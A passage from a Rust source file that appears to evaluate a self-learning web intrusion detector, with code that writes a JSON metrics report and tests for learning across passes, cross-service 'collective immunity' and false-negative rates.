                    metrics.true_negatives += 1;
                }
            }
            
            let status = if *service_id == "nginx_eval" { "(trained)" } else { "(untrained)" };
            println!("{} {}: Accuracy={:.1}% Recall={:.1}% (TP={}, FN={})",
                service_id,
                status,
                metrics.accuracy() * 100.0,
                metrics.recall() * 100.0,
                metrics.true_positives,
                metrics.false_negatives,
            );
            
            self.service_metrics.insert(service_id.to_string(), metrics);
        }
        
        self.service_metrics.clone()
    }
    
    /// Generate JSON report
    pub fn generate_report(&self, path: &str) -> std::io::Result<()> {
        let mut report = String::new();
        
        report.push_str("{\n");
        report.push_str("  \"evaluation\": \"WebGuard Self-Learning EDR\",\n");
        report.push_str(&format!("  \"timestamp\": \"{}\",\n", chrono::Utc::now().to_rfc3339()));
        report.push_str("  \"threshold\": 0.5,\n\n");
        
        // Multipass results
        report.push_str("  \"multipass_learning\": [\n");
        for (i, m) in self.metrics_by_pass.iter().enumerate() {
            report.push_str("    {\n");
            report.push_str(&format!("      \"pass\": {},\n", i));
            report.push_str(&format!("      \"accuracy\": {:.4},\n", m.accuracy()));
            report.push_str(&format!("      \"precision\": {:.4},\n", m.precision()));
            report.push_str(&format!("      \"recall\": {:.4},\n", m.recall()));
            report.push_str(&format!("      \"f1_score\": {:.4},\n", m.f1_score()));
            report.push_str(&format!("      \"false_positive_rate\": {:.4},\n", m.false_positive_rate()));
            report.push_str(&format!("      \"false_negative_rate\": {:.4},\n", m.false_negative_rate()));
            report.push_str(&format!("      \"true_positives\": {},\n", m.true_positives));
            report.push_str(&format!("      \"false_positives\": {},\n", m.false_positives));
            report.push_str(&format!("      \"true_negatives\": {},\n", m.true_negatives));
            report.push_str(&format!("      \"false_negatives\": {}\n", m.false_negatives));
            if i < self.metrics_by_pass.len() - 1 {
                report.push_str("    },\n");
            } else {
                report.push_str("    }\n");
            }
        }
        report.push_str("  ],\n\n");
        
        // Collective immunity results
        report.push_str("  \"collective_immunity\": {\n");
        let service_count = self.service_metrics.len();
        for (i, (service, m)) in self.service_metrics.iter().enumerate() {
            report.push_str(&format!("    \"{}\": {{\n", service));
            report.push_str(&format!("      \"accuracy\": {:.4},\n", m.accuracy()));
            report.push_str(&format!("      \"recall\": {:.4},\n", m.recall()));
            report.push_str(&format!("      \"true_positives\": {},\n", m.true_positives));
            report.push_str(&format!("      \"false_negatives\": {}\n", m.false_negatives));
            if i < service_count - 1 {
                report.push_str("    },\n");
            } else {
                report.push_str("    }\n");
            }
        }
        report.push_str("  }\n");
        report.push_str("}\n");
        
        let mut file = File::create(path)?;
        file.write_all(report.as_bytes())?;
        
        Ok(())
    }
}

// ============================================================================
// TESTS
// ============================================================================

#[test]
fn test_multipass_learning() {
    let mut evaluator = WebGuardEvaluator::new();
    // Run 10 passes to see extended learning curve
    let metrics = evaluator.run_multipass_evaluation(10);
    
    // Verify learning improves over passes
    assert!(metrics.len() == 10);
    
    let baseline = &metrics[0];
    let mid_pass = &metrics[4];
    let final_pass = &metrics[9];
    
    println!("\n=== MULTIPASS LEARNING SUMMARY (10 PASSES) ===");
    println!("Baseline (Pass 0): Accuracy={:.1}%, F1={:.3}, FNR={:.1}%", 
        baseline.accuracy() * 100.0, baseline.f1_score(), baseline.false_negative_rate() * 100.0);
    println!("Midpoint (Pass 4): Accuracy={:.1}%, F1={:.3}, FNR={:.1}%", 
        mid_pass.accuracy() * 100.0, mid_pass.f1_score(), mid_pass.false_negative_rate() * 100.0);
    println!("Final (Pass 9): Accuracy={:.1}%, F1={:.3}, FNR={:.1}%", 
        final_pass.accuracy() * 100.0, final_pass.f1_score(), final_pass.false_negative_rate() * 100.0);
    
    // Calculate improvement trajectory
    let improvement_0_to_4 = mid_pass.accuracy() - baseline.accuracy();
    let improvement_4_to_9 = final_pass.accuracy() - mid_pass.accuracy();
    
    println!("\nLearning Trajectory:");
    println!("  Pass 0→4: {:+.1}% accuracy", improvement_0_to_4 * 100.0);
    println!("  Pass 4→9: {:+.1}% accuracy", improvement_4_to_9 * 100.0);
    
    // Learning should improve or maintain performance
    assert!(final_pass.accuracy() >= 0.5, "Final accuracy should be at least 50%");
}

#[test]
fn test_collective_immunity() {
    let mut evaluator = WebGuardEvaluator::new();
    evaluator.setup_services();
    
    // First run multipass to establish learning
    evaluator.run_multipass_evaluation(3);
    
    // Then test collective immunity
    let service_metrics = evaluator.test_collective_immunity();
    
    println!("\n=== COLLECTIVE IMMUNITY SUMMARY ===");
    for (service, m) in &service_metrics {
        println!("{}: Recall={:.1}%", service, m.recall() * 100.0);
    }
    
    // All services should have some threat detection capability
    // due to shared PSI
    for (service, m) in &service_metrics {
        assert!(m.recall() >= 0.3, 
            "Service {} should have at least 30% recall due to collective immunity", service);
    }
}

#[test]
fn test_false_negative_priority() {
    let mut evaluator = WebGuardEvaluator::new();
    evaluator.setup_services();
    evaluator.run_multipass_evaluation(5);
    
    let final_metrics = &evaluator.metrics_by_pass[4];
    
    println!("\n=== FALSE NEGATIVE ANALYSIS ===");
    println!("False Negative Rate: {:.1}%", final_metrics.false_negative_rate() * 100.0);
    println!("False Positive Rate: {:.1}%", final_metrics.false_positive_rate() * 100.0);
    
    // For security: FNR should be lower than FPR (missing threats is worse)
    // This validates the security-first design
    println!("\nSecurity-first validation:");
    println!("  FNR ({:.1}%) should ideally be <= FPR ({:.1}%)",
        final_metrics.false_negative_rate() * 100.0,
        final_metrics.false_positive_rate() * 100.0);
}

#[test]
fn test_generate_full_report() {
    let mut evaluator = WebGuardEvaluator::new();
    evaluator.setup_services();
    // Run 10 passes for extended learning analysis
    evaluator.run_multipass_evaluation(10);
    evaluator.test_collective_immunity();
    
    evaluator.generate_report("evaluation_results/webguard_evaluation.json").unwrap();
    
    println!("\n=== REPORT GENERATED ===");
    println!("Report saved to: evaluation_results/webguard_evaluation.json");
    println!("Total samples per pass: {} attacks + {} benign + {} edge cases", 
             get_attack_samples().len(), 
             get_benign_samples().len(),
             get_edge_cases().len());
}
